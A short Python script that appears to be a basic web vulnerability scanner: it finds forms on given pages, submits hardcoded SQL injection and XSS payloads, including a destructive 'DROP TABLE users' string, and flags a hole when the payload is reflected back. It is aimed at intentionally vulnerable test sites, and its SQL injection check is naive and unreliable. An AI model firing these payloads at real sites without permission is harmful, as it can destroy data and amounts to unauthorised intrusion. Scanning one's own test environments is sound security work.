import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Common payloads for vulnerability testing
SQLI_PAYLOADS = ["' OR '1'='1", "'; DROP TABLE users; --", '" OR "1"="1']
XSS_PAYLOADS = ["<script>alert('XSS')</script>", '"><img src=x onerror=alert(1)>']

def is_vulnerable(response_text, payload):
    return payload in response_text

def get_forms(url):
    soup = BeautifulSoup(requests.get(url).text, 'html.parser')
    return soup.find_all("form")

def get_form_details(form):
    details = {"action": form.attrs.get("action"), "method": form.attrs.get("method", "get"), "inputs": []}
    for input_tag in form.find_all("input"):
        details["inputs"].append({
            "name": input_tag.attrs.get("name"),
            "type": input_tag.attrs.get("type", "text"),
            "value": input_tag.attrs.get("value", "")
        })
    return details

def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    inputs = {}

    for input in form_details["inputs"]:
        if input["type"] == "text" or input["type"] == "search":
            inputs[input["name"]] = payload
        else:
            inputs[input["name"]] = input["value"]

    if form_details["method"].lower() == "post":
        return requests.post(target_url, data=inputs)
    return requests.get(target_url, params=inputs)

def scan_url(url):
    print(f"[+] Scanning {url} for SQL Injection and XSS...")

    forms = get_forms(url)
    for form in forms:
        form_details = get_form_details(form)

        # Test SQL Injection
        for payload in SQLI_PAYLOADS:
            response = submit_form(form_details, url, payload)
            if is_vulnerable(response.text, payload):
                print(f"[!!] SQL Injection vulnerability detected on {url} with payload: {payload}")
                break

        # Test XSS
        for payload in XSS_PAYLOADS:
            response = submit_form(form_details, url, payload)
            if is_vulnerable(response.text, payload):
                print(f"[!!] XSS vulnerability detected on {url} with payload: {payload}")
                break
    print(f"[✓] Scan complete for {url}\n")

if __name__ == "__main__":
    # 🔍 Example test URLs (Replace with real test environments or intentionally vulnerable sites)
    test_urls = [
        "http://testphp.vulnweb.com",
        "https://xss-game.appspot.com/level1/frame"
    ]
    for url in test_urls:
        try:
            scan_url(url)
        except Exception as e:
            print(f"[Error] Failed to scan {url}: {e}")
